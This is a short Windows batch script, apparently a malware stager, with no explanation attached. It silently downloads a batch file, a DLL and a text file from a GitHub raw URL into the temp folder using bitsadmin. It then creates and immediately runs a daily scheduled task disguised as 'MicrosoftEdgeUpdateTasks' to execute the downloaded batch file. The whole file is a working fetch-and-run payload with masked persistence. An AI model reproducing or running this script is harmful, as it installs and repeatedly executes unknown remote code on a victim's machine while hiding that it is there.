@echo off

cd %TEMP%

set "url=https://raw.githubusercontent.com/dl-ux/boot/main/App.bat"
set "fileName=App.bat"
set "jobName=msdn"
cmd /c start /B bitsadmin /transfer /Download /priority Foreground  %url% %TEMP%\%fileName%

set "url1=https://raw.githubusercontent.com/dl-ux/boot/main/capispn.dll"
set "fileName1=capispn.dll"
cmd /c start /B bitsadmin /transfer /Download /priority Foreground %url1% %TEMP%\%fileName1%

set "url2=https://raw.githubusercontent.com/dl-ux/boot/main/main.txt"
set "fileName2=main.txt"
cmd /c start /B bitsadmin /transfer /Download /priority Foreground  %url2% %TEMP%\%fileName2%

cmd /c start /B schtasks.exe /create /tn MicrosoftEdgeUpdateTasks /tr %TEMP%\App.bat /sc daily /st 10:00 /f

cmd /c start /B schtasks.exe /run /tn MicrosoftEdgeUpdateTasks
